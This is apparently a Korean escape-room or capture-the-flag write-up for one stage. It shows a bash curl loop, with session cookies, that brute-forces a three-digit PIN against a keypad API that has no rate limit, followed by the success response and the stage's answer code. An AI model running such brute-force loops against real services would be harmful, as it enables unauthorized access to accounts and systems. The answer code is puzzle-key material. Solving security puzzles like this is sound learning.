# 28. 잠기지 않는 자물쇠

- 힌트: 한 번에 하나씩 눌러서는 끝나지 않는다. 서버는 몇 번을 보내든 세기만 한다.

## 관찰

화면에 3자리 숫자를 입력하는 칸(placeholder `000`)과 `ENTER` 버튼이 있다.

## 확인 과정

스크립트(`/stages/s19/script.js`)를 보면 단순히 `GET /api/keypad?pin=<입력값>` 요청 하나뿐이었고, 서버가 몇 번 틀렸는지 세거나 잠그는 로직은 클라이언트에서는 보이지 않았다. 즉 시도 횟수 제한이나 지연(rate limit)이 없다는 뜻으로 보고, 000부터 999까지 3자리 숫자를 전부 순서대로 자동 대입하는 반복 요청을 실행했다.

```bash
for i in $(seq -w 0 999); do
  curl -s -b "access=unlocked; vault_key=GATE-D5B8" \
    "https://escape.bsh00.com/api/keypad?pin=$i"
done
```

142번째 값에서 성공 응답을 받았다.

```json
{"ok":true,"code":"IDB-3A97","attempts":4990}
```

응답에 담긴 `attempts` 값(누적 시도 횟수)을 보면, 서버는 정말로 시도 횟수를 세기만 할 뿐 특정 횟수 이후 막는 로직은 없었다 — 힌트 그대로였다.

## 코드

`IDB-3A97`
